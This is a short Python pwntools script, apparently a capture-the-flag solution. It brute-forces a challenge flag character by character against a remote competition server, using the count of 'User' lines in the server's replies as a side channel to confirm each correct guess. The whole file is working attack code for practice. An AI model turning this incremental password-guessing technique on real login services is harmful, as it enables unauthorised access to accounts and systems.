from pwn import *
from string import printable

context.log_level = "critical"

host, port = "chal.pctf.competitivecyber.club", 4757

payload = b"pctf{TiAAAAAAAAAAA}"

correct_flag = 7
while correct_flag < 19:
    print(f"[*] Checking index {correct_flag}")
    for char in printable:
        print(f"Checking char: {char}")
        conn = remote(host, port)
        conn.recvuntil(b"password: ")

        new_payload = (
            payload[:correct_flag] + char.encode() + payload[correct_flag + 1 :]
        )
        conn.sendline(new_payload)

        count = 0
        while True:
            res = conn.recvline()
            if b"User" in res:
                count += 1
            if b"error" in res:
                break

        conn.close()
        if count > correct_flag:
            payload = new_payload
            print(payload)
            correct_flag += 1
            break

conn.interactive()
